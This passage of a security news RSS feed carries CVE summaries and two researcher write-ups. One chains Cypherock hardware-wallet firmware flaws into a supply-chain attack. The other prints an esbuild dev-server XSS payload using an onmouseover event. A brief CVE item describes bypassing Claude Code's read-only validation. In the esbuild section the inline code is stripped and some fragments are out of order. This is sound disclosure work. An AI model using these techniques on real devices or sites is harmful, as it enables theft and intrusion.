]]></content:encoded></item><item><title>CVE-2025-12138 - URL Image Importer &lt;= 1.0.6 - Authenticated (Author+) Arbitrary File Upload</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12138</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 08:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12138
 Nov. 21, 2025, 8:15 a.m. | 2 days, 9 hours ago
The URL Image Importer plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in all versions up to, and including, 1.0.6. This is due to the plugin relying on a user-controlled Content-Type HTTP header to validate file uploads in the 'uimptr_import_image_from_url()' function which writes the file to the server before performing proper validation. This makes it possible for authenticated attackers, with Author-level access and above, to upload arbitrary files on the affected site's server which may make remote code execution possible via the uploaded PHP file.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-11456 - ELEX WordPress HelpDesk &amp; Customer Ticketing System &lt;= 3.3.1 - Unauthenticated Arbitrary File Upload</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11456</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 08:15:48 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11456
 Nov. 21, 2025, 8:15 a.m. | 2 days, 9 hours ago
The ELEX WordPress HelpDesk & Customer Ticketing System plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the eh_crm_new_ticket_post() function in all versions up to, and including, 3.3.1. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>SEC Drops SolarWinds Case After Years of High-Stakes Cybersecurity Scrutiny</title><link>https://thehackernews.com/2025/11/sec-drops-solarwinds-case-after-years.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMvEKpOcEVwv6Ij_WSNiYkkN2wWOKLs16pD5v61b2ZqbuN2cadR1ZxO02SgX2XnVdKURTQwnC24frHCV28jknG_GC2hpjotuJIQB7ow6wCvsB-kguy5YJyr3MaTY-d3iMyIIfkWfhtYY3Re19kLkIXBXgBPtvINdqpmmtyBosGYfS9qjzmbNTSmPv2j_t/s1600/solarwinds.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 08:05:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Securities and Exchange Commission (SEC) has abandoned its lawsuit against SolarWinds and its chief information security officer, alleging that the company had misled investors about the security practices that led to the 2020 supply chain attack.
In a joint motion filed November 20, 2025, the SEC, along with SolarWinds and its CISO Timothy G. Brown, asked the court to voluntarily]]></content:encoded></item><item><title>How And Why We Hacked Cypherock Hardware Wallet: The Full Story</title><link>https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/</link><author>DARKNAVY</author><category>vulns</category><pubDate>Fri, 21 Nov 2025 07:47:34 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[On blockchains, whoever controls the private key to an address controls the funds in the corresponding account.

In October 2025, the U.S. government announced the seizure of **127,000 BTC** from Prince Group. On‑chain tracing reports indicated that these funds were in fact the assets stolen from the _LuBian_ mining pool in December 2020.

A Bitcoin private key is a 256‑bit random number and is, in theory, infeasible to brute‑force. How did the U.S. government obtain _LuBian_’s wallet private key?

In 2023, the Milk Sad research team discovered and disclosed a pseudo‑random number vulnerability in **Libbitcoin Explorer (bx)**: bx used only a **32‑bit** random number as a seed, and from this seed deterministically generated a 256‑bit “random” number. Such insecure randomness can be brute‑forced within hours, and LuBian’s wallet key generation suffered from the same issue.

The security threats to private keys do not end there. Beyond algorithmic flaws in software wallets themselves, the devices storing private keys are often online: system vulnerabilities, malicious plugins, phishing sites, remote‑control trojans, and other attack vectors can steal keys or signing authority without the user noticing.

To better protect private keys, hardware wallets emerged. By isolating private keys within a dedicated chip on an offline device, preventing direct exposure to the network, they are regarded as the “safe box” of digital assets.

But are hardware wallets truly absolutely secure?

In the March article _If the Person Who Finds a Web3 Hardware Wallet is a Hacker_, DARKNAVY already demonstrated an attack displaying “Hacked” on a Cypherock hardware wallet. However, merely displaying this text does not cause any real harm. Therefore, on stage at **GEEKCON 2025**, DARKNAVY showcased real‑world attacks on two hardware wallets. For Cypherock, we simulated a supply‑chain attack, tampering with the firmware, bypassing secure boot and device authenticity verification, and ultimately gaining control over newly generated mnemonic phrases.

This article outlines how DARKNAVY discovered multiple vulnerabilities and weaknesses in Cypherock and chained them together for exploitation.

## The Unique Architecture

The PIN code and mnemonic are the two most critical pieces of information in a hardware wallet; leakage of either may result in stolen funds. Therefore, many hardware wallets utilise a Secure Element _(SE)_ to protect these secrets. Although the Cypherock X1 Vault has an ATECC608A secure element built in, this SE is **only used for device authenticity checks**.

In X1’s unique architecture, the mnemonic is split into 5 shares using **Shamir’s Secret Sharing** algorithm and stored across the wallet itself _(X1 Vault)_ and 4 NFC cards. When a signature is needed, the private key can be reconstructed in the Vault using the Vault and any one of the NFC cards. PIN verification is also performed by the NFC cards.

All of the exploitation chain described here takes place on the X1 Vault MCU, and does not involve the SE or the cards.

## **Control Flow Hijacking**

Whether via manual auditing or LLM‑based automated bug hunting, one can find numerous vulnerabilities in the open‑source firmware repository of the X1 Vault. For example, when the wallet selects an applet based on the `applet_id` in a USB packet, there is an out‑of‑bounds access which makes a function pointer controllable.

```
const cy_app_desc_t *registry_get_app_desc(uint32_t app_id) { return descriptors[app_id]; // OOB } void main_menu_host_interface(engine_ctx_t *ctx, usb_event_t usb_evt, const void *data) { uint32_t applet_id = get_applet_id(); const cy_app_desc_t *desc = registry_get_app_desc(applet_id); if (NULL != desc) { desc->app(usb_evt, desc->app_config); // ...... }
```

Fixed firmware loading addresses, disabled **Canary**, and the absence of **Execute‑Never** protection allow any vulnerability to be easily converted into **ROP** or **shellcode execution**.

## The Truth About Being “Open‑source”

To research further exploitation methods, we turned to the logic of firmware upgrade and boot verification.

Although Cypherock claims to be “fully open source”, only the **“Application Firmware”** is open source. The **Bootloader** and the **Firewall Code Area**, mentioned in the documentation, are not open source. They are designed to be non-upgradeable, so we cannot extract them from firmware update packages either. Crucially, the firmware verification logic resides within these two sections.

With a simple attempt we discovered that after hijacking the control flow, the **Bootloader code segment** can be directly read and sent to the computer via USB. However the **Firewall Code** _(and Firewall Data Storage)_ cannot be read. By reverse‑engineering the Firewall initialisation logic within the Bootloader, we confirmed that the unreadable memory segment is indeed protected.

> Firewall is a hardware security feature provided by the STM32L4 series, implementing memory access isolation.
>
> STM32L4 allows the user to define one protected region each for Code, Non‑Volatile Data, and Volatile Data; only instructions in the Firewall Code region may access the protected areas.
>
> In addition, Firewall Code can only be called via a Call Gate; directly jumping into an address inside the protected region is treated as an illegal access.

As only the Firewall Code can read itself, we turned our attention to analysing the Firewall’s functionality in order to discover vulnerabilities.

## Tearing Through The Firewall Protection

The Firewall Call Gate entry is implemented as a function; the parameter `task` distinguishes functionality, along with two address pointers and their size.

```
static uint32_t firewall_func(const uint32_t task, const uint8_t *data, const uint32_t size, const uint32_t address)
```

The Application Firmware mostly uses the Firewall to read and write the Firewall‑protected **NVDATA** region. This region contains 4 pages:

1. Primary Bootloader Data: stores firmware version, firmware hash, device state, etc.
2. Backup Bootloader Data: backup of the above information
3. Permanent Key Storage: stores various device keys
4. Secure Data Storage: stores wallet information, etc.

For the first two pages, the Firewall exposes only limited, restricted read/write interfaces. For the last two pages, multiple tasks are provided for read/write, analogous to `**memcpy**`: the `address` parameter points into the protected region, while `data` points to external data. The Firewall code should have validated the ranges of both pointers and the read/write length, but testing showed that the **WRITE** functionality allows `data` to be any address. By setting `**data**` to point to the Firewall Code, we can copy ( **WRITE**) the protected code into **NVDATA**, and then **READ** the **NVDATA** out.

There is one last small obstacle: **WRITE** is not a simple memory copy but a Flash write. Before repeatedly writing to the same address, the entire page must first be erased. To avoid corrupting valid NVDATA and bricking the device, we located a function that erases **Secure Data Storage** and then rewrites the latest full data. At this point, the remaining free space in this page can be safely used to dump Firewall Code.

## Fragmented Upgrade Logic

Having obtained full codes within the MCU, we can now truly analyse the firmware verification logic. Skipping the reverse‑engineering process, here is a summary of the firmware ( _Application Firmware_) upgrade flow:

1. The Application Firmware sets
    `BOOTSTATE` to “upgrading” via the Firewall and then reboots the device.
2. The Bootloader enters the upgrade process, receives the firmware header from USB, then calls multiple Firewall tasks to:

   a. Set
    `BOOTSTATE` to “in upgrade”.
   b. Verify the signature on the firmware header, then store the firmware version and size in Bootloader RAM.

   c. Store the firmware’s signature in Bootloader RAM.

3. The Bootloader receives the full firmware from USB page by page, erasing and writing the corresponding Flash regions.

4. The Bootloader again calls multiple Firewall tasks to:

   d. Hashing the current (newly-written) firmware, and verify it against the signature saved in step 1c.

   e. Hashing the current firmware again, and together with the firmware version and size saved in step 1b, write them into
    **Primary Bootloader Data**, and restore `BOOTSTATE` to the normal state.

If at any point the USB connection is interrupted or any verification fails, the device reboots immediately and re‑enters the upgrade process.

Note that the upgrade flow has serious flaws: each Firewall task is independent and **can be executed out of order** (in particular, the two signature verifications in **1b** and **1c**); the firmware signature is never written to Flash, and on boot **only integrity is checked, not authenticity**.

Thus, after hijacking MCU control flow, we can directly erase and rewrite the firmware code and then call the Firewall task from **3e** to calculate and store the current (malicious) firmware hash, achieving firmware tampering. As for the parameters saved after verification in step **1b** that **3e** relies on, we can simply modify them—attentive readers may have noticed that the Bootloader and Firewall Code share the same RAM, and the Firewall initialization code does not set any protection for the Volatile Data region.

## **Illusory Authenticity Verification**

At GEEKCON, we simulated what an ordinary user might do when first receiving a newly purchased Cypherock wallet for “inspection”: the judge connected the **wallet already compromised by the contestant** to a computer and used Cypherock’s CySync software to perform a device authenticity check. Seconds later, this backdoored wallet passed the vendor’s check, with “verification passed” shown both on the computer and on the wallet screen.

According to the vendor’s design, the first boot after flashing the wallet firmware should trigger a mandatory device authenticity check, and tampered firmware should not be able to pass this check. So how did we achieve the last step in the supply‑chain attack?

Cypherock’s authenticity verification process is shown in the diagram; the Vault’s SE finally comes into play: it uses a built‑in private key to sign twice—first over the device serial number, then over the XOR of a cloud‑generated nonce and the firmware hash. Once the cloud returns the verification result, the device saves the status.

Since the second signature incorporates the firmware hash, and the client PC also submits the device’s firmware version, the cloud can determine whether the firmware hash is correct. However, the SE cannot directly read the firmware; what authenticity is there in a hash provided by malicious firmware?

In addition, this check is only **unidirectional**: the cloud verifies the device, but the device does not verify the cloud. If the goal is merely to bypass the device‑side check, the client can simply return “success” locally.

## The Vendor’s Attitude

Although Cypherock loudly boasts itself as the “Safest Hardware Wallet” and offers a public bug bounty program on its website, its attitude toward both users and security researchers can be summarised as **silence is golden**.

In March, DARKNAVY reported two vulnerabilities to Cypherock by email. They silently pushed patches to GitHub but did not even bother to send an acknowledgment. Coincidentally, at this year’s Hexacon, the session titled “ **Breaking the Vault: USB Bugs and Bug Bounty Failures**” explicitly highlighted the experiences of peers reporting vulnerabilities to Cypherock.

Vulnerability fixes also lack transparency, leaving users entirely in the dark about the security state of their devices; when people ask about sessions on conferences, the vendor brushes them off with a perfunctory “already resolved long ago”.

Therefore, for the Bootloader and Firewall vulnerabilities involved this time, we chained them to flash a custom firmware, replacing the boot logo and mnemonic display, just for amusement.]]></content:encoded></item><item><title>CERT-In Warns of Critical Asus Router Flaw Exposing Millions in India</title><link>https://thecyberexpress.com/cert-in-warning-asus-router-cve-2025-59367/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 06:58:23 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            According to the Indian Computer Emergency Response Team (CERT-In), thousands of households, small offices, and service providers across the country may already be at risk due to a newly uncovered aut ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>SonicOS SSLVPN Vulnerability Let Attackers Crash the Firewall Remotely</title><link>https://cybersecuritynews.com/sonicos-sslvpn-vulnerability-firewall-crash/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 06:36:13 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            SonicWall has disclosed a critical stack-based buffer overflow vulnerability in its SonicOS SSLVPN service. That allows remote unauthenticated attackers to crash firewalls through denial-of-service at ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-64695 - LogStare Collector Windows Installer Uncontrolled Search Path Element Vulnerability (RCE)</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64695</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 06:18:05 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64695
 Nov. 21, 2025, 7:15 a.m. | 2 days, 10 hours ago
Uncontrolled search path element issue exists in the installer of LogStare Collector (for Windows). If exploited, arbitrary code may be executed with the privilege of the user invoking the installer.
 8.4 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Salesforce Flags Unauthorized Data Access via Gainsight-Linked OAuth Activity</title><link>https://thehackernews.com/2025/11/salesforce-flags-unauthorized-data.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHdytMLXEXAyU2NJK6I9fULfbh3_5LHXiwqUiFrPD9dP1oEttB2sIbilhx2JTfRV70qGw9NTB4a4C3iqkAfnoR5m4lLxxKBNBWTI6DVQYP3wwHPQHFBkAec9GjKXpzFgMrne79uyQeVa31-yB4vx1nG3FDWsCj3ZHxxLUfk17qAx95t0IeqCSPVu47pILv/s1600/salesforce.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 05:32:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Salesforce has warned of detected "unusual activity" related to Gainsight-published applications connected to the platform.
"Our investigation indicates this activity may have enabled unauthorized access to certain customers’ Salesforce data through the app's connection," the company said in an advisory.
The cloud services firm said it has taken the step of revoking all active access and refresh]]></content:encoded></item><item><title>Oracle Allegedly Breached by Clop Ransomware via E-Business Suite 0-Day Hack</title><link>https://cybersecuritynews.com/oracle-breach-clop-ransomware/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 03:38:16 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            The notorious Clop ransomware gang has listed Oracle on its dark web leak site, alleging a successful breach of the tech giant’s internal systems.
This development is part of a massive extortion campa ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-64310 - Epson Projector WebConfig Brute Force Authentication Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64310</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 03:16:10 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64310
 Nov. 21, 2025, 3:16 a.m. | 2 days, 14 hours ago
EPSON WebConfig and Epson Web Control for SEIKO EPSON Projector Products do not restrict excessive authentication attempts. An administrative user's password may be identified through a brute force attack.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-64762 - authkit-nextjs may let session cookies be cached in CDNs</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64762</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 02:15:44 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64762
 Nov. 21, 2025, 2:15 a.m. | 2 days, 13 hours ago
The AuthKit library for Next.js provides convenient helpers for authentication and session management using WorkOS & AuthKit with Next.js. In authkit-nextjs version 2.11.0 and below, authenticated responses do not defensively apply anti-caching headers. In environments where CDN caching is enabled, this can result in session tokens being included in cached responses and subsequently served to multiple users. Next.js applications deployed on Vercel are unaffected unless they manually enable CDN caching by setting cache headers on authenticated paths. Patched in authkit-nextjs 2.11.1, which applies anti-caching headers to all responses behind authentication.
 8.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-62164 - VLLM deserialization vulnerability leading to DoS and potential RCE</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62164</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 02:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62164
 Nov. 21, 2025, 2:15 a.m. | 2 days, 9 hours ago
vLLM is an inference and serving engine for large language models (LLMs). From versions 0.10.2 to before 0.11.1, a memory corruption vulnerability could lead to a crash (denial-of-service) and potentially remote code execution (RCE), exists in the Completions API endpoint. When processing user-supplied prompt embeddings, the endpoint loads serialized tensors using torch.load() without sufficient validation. Due to a change introduced in PyTorch 2.8.0, sparse tensor integrity checks are disabled by default. As a result, maliciously crafted tensors can bypass internal bounds checks and trigger an out-of-bounds memory write during the call to to_dense(). This memory corruption can crash vLLM and potentially lead to code execution on the server hosting vLLM. This issue has been patched in version 0.11.1.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-62372 - vLLM vulnerable to DoS with incorrect shape of multimodal embedding inputs</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62372</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 02:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62372
 Nov. 21, 2025, 2:15 a.m. | 2 days, 11 hours ago
vLLM is an inference and serving engine for large language models (LLMs). From version 0.5.5 to before 0.11.1, users can crash the vLLM engine serving multimodal models by passing multimodal embedding inputs with correct ndim but incorrect shape (e.g. hidden dimension is wrong), regardless of whether the model is intended to support such inputs (as defined in the Supported Models page). This issue has been patched in version 0.11.1.
 8.3 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-64755 - @anthropic-ai/claude-code has Sed Command Validation Bypass that Allows Arbitrary File Writes</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64755</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 02:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64755
 Nov. 21, 2025, 2:15 a.m. | 2 days, 11 hours ago
Claude Code is an agentic coding tool. Prior to version 2.0.31, due to an error in sed command parsing, it was possible to bypass the Claude Code read-only validation and write to arbitrary files on the host system. This issue has been patched in version 2.0.31.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>ISC Stormcast For Friday, November 21st, 2025 https://isc.sans.edu/podcastdetail/9710, (Fri, Nov 21st)</title><link>https://isc.sans.edu/diary/rss/32508</link><author></author><category>threatintel</category><pubDate>Fri, 21 Nov 2025 02:00:03 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Critical WSUS RCE (CVE-2025-59287) Actively Exploited to Deploy ShadowPad Backdoor</title><link>https://securityonline.info/critical-wsus-rce-cve-2025-59287-actively-exploited-to-deploy-shadowpad-backdoor/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 00:06:54 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical WSUS RCE (CVE-2025-59287) Actively Exploited to Deploy ShadowPad Backdoor
            The AhnLab Security Intelligence Center (ASEC) has uncovered an active exploitation campaign in which threat actors weaponized a newly disclosed remote code execution (RCE) vulnerability in Microsoft  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Esbuild XSS Bug That Survived 5B Downloads and Bypassed HTML Sanitization</title><link>https://www.depthfirst.com/post/esbuilds-xss-bug-that-survived-5-billion-downloads-and-bypassed-html-sanitization</link><author>/u/va_start</author><category>netsec</category><pubDate>Fri, 21 Nov 2025 00:03:07 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Esbuild has been downloaded 5 billion times since this XSS bug was introduced in 2022. The bug hid in a function that promised to escape html called . But, apparently, the promise was more of a suggestion. To bypass the HTML escaping, I used the , literally a quote . A malicious folder with a quote in its name could be used to attack anyone using the dev server. The fix was one line. The exploit involved making an invisible script take over your entire screen. The Initial Finding: Suspicious XSSThis adventure kicked off with our depthfirst system tapping me on the shoulder like an overeager intern with a suspiciously confident smile.>  XSS in esbuild dev server: github.com/evanw/esbuild (40k Github stars)html.WriteString(escapeForHTML( ... ))In esbuild? Using a function literally named? Unlikely. I had the same reaction you’d have if someone told you a toaster was capable of launching a space shuttle: charming, but wrong.Our system claimed there’s an XSS bug inside code designed to prevent XSS? In a major codebase built around generating safe HTML? If true, that’s like finding out the lifeguard can't swim.Still, if valid, this would be a significant finding. The esbuilt npm package alone has five billion downloads. And a restless “but what if?” rang in the back of my mind. So I sighed, cracked my knuckles, and set out to prove the machine wrong. Spoiler: the machine was  wrong.The Investigation: A Friendly Challenge Turns Into a Rabbit HoleThe depthfirst system had already labeled it “low severity,” which is our polite way of telling engineers, “not a fire, but this smells funny.”But I couldn’t let it go. Even when a machine says “low severity,” I still want to understand  it thinks something is off. It’s like hearing your dog growl at a blank wall. Maybe it’s nothing, but maybe it’s time to call a priest.So I followed the trail into esbuild’s code.Here’s the vulnerable code :}
	}
		}
		html.WriteString(escapeForHTML(part))
		}
	}
}At first, nothing seemed odd. The dev server is creating the  title from directory listings. It's escaping  HTML in the folder names. All the classics get neutralized: But one thing  get escaped. Quotes .I have confirmed our system's finding and suddenly everything clicked into place. I gave my laptop a pat on the head to reward the AI.HTML 101: The Difference Between Text and Attributes correctly protects you when you put user-controlled text  tags, like:But esbuild wasn’t putting the escaped text there. It was putting it  an HTML attribute, in an :If your sanitization doesn’t escape double quotes, you can break out of the attribute and add your own. You can slap on a new , an event handler, or an entire circus of JavaScript!The correct function to use was :	text = escapeForHTML(text)
}
Crafting the Exploit: Making an Invisible Screen-Sized MousetrapOnce I realized I could break out of the attribute, the rest was pure puzzle-solving joy.I needed a folder name that:Included a double quote to terminate the attributeAdded a malicious attribute to execute JavascriptWorked even though esbuild would automatically append  at the endEasily triggered (because asking a user to click a link isn't sexy).Here’s the command that created the malicious directory:style="position:absolute;top:0;left:0;width:100vw;height:100vh;"This creates an invisible full-screen div. This is important for the next part.onmouseover="alert('xss')"The moment your cursor moves over the div, which is now the whole screen, boom. Arbitrary JavaScript execution.This dummy attribute was the key to neutralizing esbuild’s auto-appended /". I needed a place to  the trailing characters so they don't cause a syntax error in the other attributes.Reload the dev server. Move your mouse. Instant satisfaction.The Fix: A One-Word Patch and a Thoughtful MaintainerAfter confirming the exploit was real, I sent the automatically generated fix upstream. The patch was immediately merged.The fix? Literally a swap:+ escapeForAttribute(...)One word. Billions of future downloads affected.I love bugs like this. They're subtle, and make you think deeply about the edge cases of the code.The maintainers thanked us for finding and fixing the bug, and was correct to point out this didn't have a security impact. Since this only affects the dev server, and the dev server assumes a trusted environment, it’s not a “security vulnerability” in the traditional sense. And that’s true. This wasn’t a CVE-worthy disaster. No one’s production servers were melting because of this.But it was still a . An elusive, fun, intellectually stimulating bug that was completely exploitable.And depthfirst’s system correctly found, categorized, and drafted a patch. All automatically.I just got to be the human who enjoyed the ride.This adventure felt like tugging on a loose thread in a sweater: you don’t expect much, but suddenly half the sleeve is in your hand. All I did was follow a quote mark out of an attribute, and it led to a bug that had been downloaded billions of times. The funny part is that nothing here was “wrong” in isolation. The trick was noticing the context had changed.  was perfectly fine for text, just not for attributes.Depthfirst surfaced the loose thread; I pulled it because I can’t resist seeing where those threads lead. Together, we solved a tiny mystery tucked away in a project downloaded five billion times.]]></content:encoded></item><item><title>SonicWall Warns of New SonicOS SSLVPN Pre-Auth Buffer Overflow Vulnerability (CVE-2025-40601)</title><link>https://securityonline.info/sonicwall-warns-of-new-sonicos-sslvpn-pre-auth-buffer-overflow-vulnerability-cve-2025-40601/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 00:01:08 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            SonicWall has issued a security advisory for a newly identified pre-authentication stack-based buffer overflow vulnerability in its SonicOS SSLVPN service. Tracked as CVE-2025-40601 and assigned a CVS ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-62459 - Microsoft Defender Portal Spoofing Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62459</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:56 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62459
 Nov. 20, 2025, 11:15 p.m. | 2 days, 12 hours ago
Microsoft Defender Portal Spoofing Vulnerability
 8.3 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-64655 - Dynamics OmniChannel SDK Storage Containers Elevation of Privilege Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64655</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:56 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64655
 Nov. 20, 2025, 11:15 p.m. | 2 days, 12 hours ago
Improper authorization in Dynamics OmniChannel SDK Storage Containers allows an unauthorized attacker to elevate privileges over a network.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-62207 - Azure Monitor Elevation of Privilege Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62207</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:55 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62207
 Nov. 20, 2025, 11:15 p.m. | 2 days, 12 hours ago
Azure Monitor Elevation of Privilege Vulnerability
 8.6 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-59245 - Microsoft SharePoint Online Elevation of Privilege Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59245</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59245
 Nov. 20, 2025, 11:15 p.m. | 1 day ago
Microsoft SharePoint Online Elevation of Privilege Vulnerability
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-36072 - IBM webMethods Integration Deserialization</title><link>https://cvefeed.io/vuln/detail/CVE-2025-36072</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:51 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-36072
 Nov. 20, 2025, 11:15 p.m. | 22 hours, 15 minutes ago
IBM webMethods Integration 10.11 through 10.11_Core_Fix22, 10.15 through 10.15_Core_Fix22, and 11.1 through 11.1_Core_Fix6 IBM webMethods Integration allow an authenticated user to execute arbitrary code on the system, caused by the deserialization of untrusted object graphs data.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-49752 - Azure Bastion Elevation of Privilege Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-49752</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 23:15:51 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-49752
 Nov. 20, 2025, 11:15 p.m. | 22 hours, 15 minutes ago
Azure Bastion Elevation of Privilege Vulnerability
 10.0 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Google exposes BadAudio malware used in APT24 espionage campaigns</title><link>https://www.bleepingcomputer.com/news/security/google-exposes-badaudio-malware-used-in-apt24-espionage-campaigns/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 20 Nov 2025 22:12:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[China-linked APT24 hackers have been using a previously undocumented malware called BadAudio in a three-year espionage campaign that recently switched to more sophisticated attack methods. [...]]]></content:encoded></item><item><title>Budget Samsung phones shipped with unremovable spyware, say researchers</title><link>https://www.malwarebytes.com/blog/news/2025/11/budget-samsung-phones-shipped-with-unremovable-spyware-say-researchers</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 21:30:00 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[A controversy over data-gathering software secretly installed on Samsung phones has erupted again after a new accusatory post appeared on X last week.In the post on the social media site, cybersecurity newsletter International Cyber Digest warned about a secretive application called AppCloud that Samsung had allegedly put on its phones. The software was, it said,This all harks back to May, when digital rights group SMEX published an open letter to Samsung. It accused the company of installing AppCloud on its Galaxy A and M series devices, although stopped short of calling it spyware, opting for the slightly more diplomatic “bloatware”.The application, apparently installed on 